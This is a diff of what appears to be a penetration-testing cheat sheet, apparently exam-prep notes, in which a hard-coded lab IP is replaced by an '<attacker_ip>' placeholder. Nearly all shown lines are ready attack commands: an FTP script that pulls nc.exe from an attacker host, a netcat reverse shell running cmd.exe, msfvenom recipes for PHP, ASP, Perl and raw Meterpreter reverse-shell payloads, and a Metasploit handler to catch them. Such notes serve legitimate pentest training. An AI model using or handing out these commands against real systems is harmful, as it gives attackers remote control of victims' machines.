@@ -344,14 +344,14 @@ netsh firewall set service remotedesktop enable*
 
 Transferring files
     with ftp (run ftp.sh in your box):
-    *echo open 10.11.0.123 21> ftp.txt
+    *echo open <attacker_ip> 21> ftp.txt
 echo USER offsec>> ftp.txt
 echo ftp>> ftp.txt
 echo bin >> ftp.txt
 echo GET nc.exe >> ftp.txt
 echo bye >> ftp.txt
 ftp -v -n -s:ftp.txt
-nc.exe 10.11.0.123 1234 -e cmd.exe*
+nc.exe <attacker_ip> 1234 -e cmd.exe*
     Bounce port sannning
     *$ $ nc $ip 21
 220 Femitter FTP Server ready.
@@ -379,18 +379,18 @@ https://github.com/Jean13/Penetration_Testing/blob/master/Privilege_Escalation/w
 
     Generate php reverse shell:
     *msfvenom -p php/reverse_php LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.php
-msfvenom -p php/meterpreter/reverse_tcp LHOST=10.11.0.123 -o meterpreter.php
-msfvenom -p generic/shell_reverse_tcp LHOST=10.11.0.123 LPORT=4444 -f php -o shell.php*
+msfvenom -p php/meterpreter/reverse_tcp LHOST=<attacker_ip> -o meterpreter.php
+msfvenom -p generic/shell_reverse_tcp LHOST=<attacker_ip> LPORT=4444 -f php -o shell.php*
     Others
     *$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f asp > shell.asp*
     Generate shellcode to use within a perl exploit:
-    *msfvenom -p linux/x86/shell/reverse_tcp LHOST=10.11.0.123 LPORT=443 -f perl -b \x00\x0A\x0D\xFF*
+    *msfvenom -p linux/x86/shell/reverse_tcp LHOST=<attacker_ip> LPORT=443 -f perl -b \x00\x0A\x0D\xFF*
     Raw paylaod:
-    *msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.11.0.123 LPORT=4444 -f raw -o test.bin*
+    *msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<attacker_ip> LPORT=4444 -f raw -o test.bin*
     Handling reverse shell using meterpreter:
     *msf > use exploit/multi/handler
 msf > set lport 1234
-msf > set lhost 10.11.0.123
+msf > set lhost <attacker_ip>
 msf > set payload windows/shell/reverse_tcp
 msf > run*
     Other payloads:
